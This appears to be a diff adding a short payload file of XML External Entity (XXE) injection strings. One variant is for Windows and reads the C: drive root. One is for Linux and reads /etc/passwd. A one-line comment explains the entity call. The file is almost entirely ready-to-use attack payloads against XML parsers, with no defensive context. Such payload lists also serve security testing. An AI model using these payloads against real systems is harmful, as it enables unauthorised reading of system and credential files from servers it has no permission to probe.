@@ -1,0 +1,11 @@
+Windows
+<?xml version="1.0"?><!DOCTYPE my [<!ENTITY root SYSTEM "file:///C:/">]>
+<comment><text>&root;</text></comment>
+
+Linux
+<?xml version="1.0"?><!DOCTYPE my [<!ENTITY root SYSTEM "file:///etc/passwd">]>
+<comment><text>&root;</text></comment>
+
+
+
+#root is just the variable call. "file:///" is the code to be called by the variable. 
